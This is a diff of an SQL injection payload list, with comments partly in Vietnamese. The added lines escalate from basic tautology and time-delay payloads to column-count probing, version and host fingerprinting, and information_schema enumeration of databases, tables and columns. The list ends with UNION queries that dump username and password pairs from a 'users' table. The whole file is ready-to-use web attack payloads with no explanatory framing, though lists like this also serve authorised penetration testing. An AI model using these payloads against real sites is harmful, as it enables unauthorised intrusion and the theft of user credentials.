@@ -1,14 +1,53 @@
-# Error-Based Payloads
+# Payloads for testing
 ' OR '1'='1'-- x
-' OR "1"="1"-- x
-' UNION SELECT NULL,NULL,NULL-- x
-
-# Boolean-Based Payloads
 ' OR 1=1-- x
-' AND 1=0-- x
-
-# Time-Based Payloads
 ' OR SLEEP(5)-- x
 ' WAITFOR DELAY '0:0:5'-- x
-' AND SLEEP(5)-- x
+' UNION SELECT NULL,NULL,NULL-- x
+# Another comment
+' AND 1=0-- x
 ' OR IF(1=1, SLEEP(5), 0)-- x
+# --- Guessing Number of Columns ---
+' ORDER BY 1-- x
+' ORDER BY 2-- x
+' ORDER BY 3-- x
+' ORDER BY 4-- x
+' ORDER BY 5-- x
+' ORDER BY 10-- x
+' ORDER BY 20-- x
+# Thêm các biến thể nếu nghi ngờ injection point nằm trong dấu ngoặc
+') ORDER BY 1-- x
+") ORDER BY 1-- x
+
+# --- Fingerprinting (assuming 2 columns) ---
+' UNION SELECT @@version, @@hostname -- x
+' UNION SELECT user(), database() -- x
+' UNION SELECT version(), sleep(5) -- x  # Kết hợp lấy version và time-based
+' UNION SELECT NULL, schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0-- x # Lấy tên DB đầu tiên
+' UNION SELECT NULL, schema_name FROM information_schema.schemata LIMIT 1 OFFSET 1-- x # Lấy tên DB thứ hai
+
+# --- Fingerprinting (assuming 3 columns) ---
+' UNION SELECT @@version, @@hostname, user() -- x
+' UNION SELECT database(), user(), version() -- x
+' UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata LIMIT 1 OFFSET 0-- x # Lấy tên DB đầu tiên
+
+# --- Schema Enumeration (assuming 2 columns) ---
+' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- x # Lấy tên bảng đầu tiên
+' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1-- x # Lấy tên bảng thứ hai
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0-- x # Lấy tên cột đầu tiên của bảng 'users'
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 1-- x # Lấy tên cột thứ hai của bảng 'users'
+' UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema=database()-- x # Lấy danh sách các bảng (có thể bị cắt ngắn)
+
+# --- Schema Enumeration (assuming 3 columns) ---
+' UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- x
+' UNION SELECT column_name, table_name, NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0-- x
+' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name='users'-- x # Lấy các cột của bảng 'users'
+
+# --- Data Dumping (assuming 2 columns from 'users') ---
+' UNION SELECT username, password FROM users LIMIT 1 OFFSET 0-- x # Lấy user/pass đầu tiên
+' UNION SELECT username, password FROM users LIMIT 1 OFFSET 1-- x # Lấy user/pass thứ hai
+' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR ';'), NULL FROM users-- x # Dump nhiều user/pass
+
+# --- Data Dumping (assuming 3 columns from 'users') ---
+' UNION SELECT id, username, password FROM users LIMIT 1 OFFSET 0-- x
+' UNION SELECT GROUP_CONCAT(id,':',username,':',password SEPARATOR ';'), NULL, NULL FROM users-- x
